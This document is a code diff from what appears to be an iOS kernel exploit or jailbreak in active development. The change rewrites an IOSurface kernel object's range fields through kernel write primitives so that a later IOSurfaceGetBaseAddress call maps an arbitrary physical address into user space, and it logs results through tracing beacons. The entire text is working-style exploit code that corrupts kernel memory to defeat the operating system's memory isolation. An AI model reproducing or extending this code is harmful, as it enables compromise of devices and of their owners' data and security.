@@ -195,19 +195,14 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	// v78 PHASE A: lookup on the INTACT descriptor — the only configuration
-	// that maps (v77 win0: lookup=1, base!=0; every rewritten: lookup=0).
+	// v78 PHASE A: lookup on the INTACT descriptor (the only proven-working
+	// configuration). NO GetBaseAddress here — v79 keeps the call cold so
+	// the post-rewrite call is the FIRST one (v78 proved a warmed call
+	// returns the original mapping).
 	IOSurfaceRef refA = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	jb_tr_beacon("KMAP A,lookup=%d", refA != NULL);
 	if (!refA) {
 		jb_tr_beacon("KMAP fail,lookupA");
-		*uaddr = NULL;
-		return -1;
-	}
-	void *base0 = IOSurfaceGetBaseAddress(refA);
-	jb_tr_beacon("KMAP A,base0=%llx", (unsigned long long)(uintptr_t)base0);
-	if (!base0) {
-		jb_tr_beacon("KMAP fail,base0A");
 		*uaddr = NULL;
 		return -1;
 	}
@@ -234,6 +229,17 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		cleanups[cleanupsCount-1].descriptor = desc;
 		cleanups[cleanupsCount-1].origRanges = ranges;
 		cleanups[cleanupsCount-1].fakeRangesUA = fakeRanges;
+		// v79: the IOSurface KERNEL OBJECT carries its own copies —
+		// IOSurface.ranges@0x360, rangeCount@0x3a4 (KPF table). v78 proved
+		// GetBaseAddress ignores the descriptor-only retarget; the mapper
+		// likely reads the surface's copy. Rewrite both (large objects,
+		// RMW-safe).
+		kwrite64(surface + 0x360, fakeRanges_kva);
+		kwrite32(surface + 0x3a4, 1);
+		jb_tr_beacon("KMAP rb,surface,r360=%llx,expect=%llx,rc3a4=%x",
+		             (unsigned long long)kread64(surface + 0x360),
+		             (unsigned long long)fakeRanges_kva,
+		             (unsigned int)kread32(surface + 0x3a4));
 	}
 	else {
 		// v75 NOTE: this branch (minsafe<=0x10) writes the 16-byte ranges
@@ -273,14 +279,17 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
 
-	// v78 PHASE B verdict: GetBaseAddress on the RETARGETED descriptor.
-	// base1==base0 → the call cached the original mapping (rewrite ignored)
-	// → v79 goes IOSurfaceClient walk. base1!=base0 → new mapping — the
-	// probe's 0x10000-bounded read decides HIT/miss.
+	// v79 PHASE C: FIRST (cold) GetBaseAddress — after the full retarget.
+	// If the surface-field rewrite is what the mapper reads, this maps the
+	// requested PA. First qwords discriminate: identical/zero-ish pattern in
+	// every window = own memory again; per-PA varying content = retargeted.
 	void *base1 = IOSurfaceGetBaseAddress(refA);
-	jb_tr_beacon("KMAP B,base=%llx,base0=%llx",
-	             (unsigned long long)(uintptr_t)base1,
-	             (unsigned long long)(uintptr_t)base0);
+	jb_tr_beacon("KMAP C,base=%llx", (unsigned long long)(uintptr_t)base1);
+	if (base1) {
+		jb_tr_beacon("KMAP C,first=%llx,%llx",
+		             (unsigned long long)*(volatile uint64_t *)base1,
+		             (unsigned long long)((volatile uint64_t *)base1)[1]);
+	}
 	*uaddr = base1;
 	return 0;
 }
